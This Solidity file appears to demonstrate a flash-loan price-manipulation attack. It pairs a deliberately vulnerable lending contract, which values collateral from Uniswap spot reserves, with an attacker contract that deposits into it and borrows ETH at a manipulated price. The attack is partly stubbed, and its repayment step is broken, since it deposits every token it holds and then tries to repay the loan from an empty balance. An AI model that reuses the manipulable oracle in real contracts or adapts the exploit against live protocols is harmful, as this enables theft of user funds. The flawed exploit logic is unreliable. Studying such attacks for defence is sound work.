// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// Interface for Uniswap V2 Pair
interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

// Interface for Flash loan provider (e.g., Aave)
interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// Vulnerable lending protocol
contract VulnerableLending is ReentrancyGuard {
    IUniswapV2Pair public immutable uniswapPair;
    IERC20 public immutable token;
    mapping(address => uint256) public deposits;
    
    constructor(address _uniswapPair, address _token) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        token = IERC20(_token);
    }
    
    // Gets price from Uniswap - vulnerable to manipulation
    function getPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = uniswapPair.getReserves();
        
        // Assuming token is token0 in the pair
        if (uniswapPair.token0() == address(token)) {
            return (uint256(reserve1) * 1e18) / uint256(reserve0);
        } else {
            return (uint256(reserve0) * 1e18) / uint256(reserve1);
        }
    }
    
    // Users can deposit tokens and get ETH loans based on token price
    function deposit(uint256 amount) external nonReentrant {
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        deposits[msg.sender] += amount;
    }
    
    // Vulnerable borrow function that relies on manipulatable price
    function borrow(uint256 tokenAmount) external nonReentrant {
        require(deposits[msg.sender] >= tokenAmount, "Insufficient deposit");
        
        uint256 price = getPrice();
        uint256 ethToSend = (tokenAmount * price) / 1e18;
        
        require(address(this).balance >= ethToSend, "Insufficient ETH in contract");
        deposits[msg.sender] -= tokenAmount;
        
        (bool success,) = msg.sender.call{value: ethToSend}("");
        require(success, "ETH transfer failed");
    }
    
    // Allow contract to receive ETH
    receive() external payable {}
}

// Attacker contract that performs the flash loan attack
contract PriceManipulationAttack is IFlashLoanReceiver {
    IUniswapV2Pair public immutable uniswapPair;
    VulnerableLending public immutable lendingProtocol;
    IERC20 public immutable token;
    
    constructor(
        address _uniswapPair,
        address _lendingProtocol,
        address _token
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        lendingProtocol = VulnerableLending(_lendingProtocol);
        token = IERC20(_token);
    }
    
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 1. Approve Uniswap to spend our flash loaned tokens
        token.approve(address(uniswapPair), amounts[0]);
        
        // 2. Manipulate the price by dumping tokens into Uniswap
        // (Implementation depends on specific Uniswap interface)
        
        // 3. Now that price is manipulated, exploit the lending protocol
        uint256 depositAmount = token.balanceOf(address(this));
        token.approve(address(lendingProtocol), depositAmount);
        lendingProtocol.deposit(depositAmount);
        lendingProtocol.borrow(depositAmount);
        
        // 4. Return the flash loaned amount plus premium
        uint256 amountToReturn = amounts[0] + premiums[0];
        require(
            token.transfer(msg.sender, amountToReturn),
            "Failed to return flash loan"
        );
        
        return true;
    }
    
    // Function to start the attack
    function attack(
        address flashLoanProvider,
        uint256 flashLoanAmount
    ) external {
        // Implementation depends on specific flash loan provider
        // This would call the flash loan and start the attack
    }
    
    receive() external payable {}
}